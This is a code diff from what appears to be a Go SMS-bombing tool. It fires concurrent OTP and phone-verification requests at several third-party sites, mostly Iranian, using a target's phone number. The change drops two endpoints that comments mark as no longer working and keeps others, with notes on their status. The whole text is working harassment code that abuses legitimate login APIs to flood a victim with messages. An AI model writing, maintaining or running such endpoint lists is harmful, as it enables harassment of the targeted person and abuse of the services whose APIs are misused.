@@ -329,12 +329,6 @@ func main() {
 		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
 			s57: phone,
 		}, ch) // verify site: i'm not robot
-		go sms("https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // delete site: no Access
-		go sms("https://agent.wide-app.ir/auth/token", map[string]interface{}{
-			"'grant_type': 'otp', 'client_id': '62b30c4af53e3b0cf100a4a0', 'phone'": phone,
-		}, ch) // error site: secure connection
 		go sms("https://api.zarinplus.com/user/otp/", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)  // edit & Alternative :4/22/2025
